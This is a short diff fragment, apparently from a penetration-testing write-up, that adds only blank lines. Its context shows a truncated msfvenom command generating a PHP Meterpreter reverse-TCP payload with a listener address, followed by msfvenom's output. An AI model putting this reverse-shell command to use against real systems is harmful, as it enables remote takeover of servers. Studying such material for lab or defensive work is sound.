@@ -34,3 +34,5 @@ root@hackers:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.162.187 LPO
 No encoder or badchars specified, outputting raw payload
 Payload size: 1115 bytes
 ```
+
+
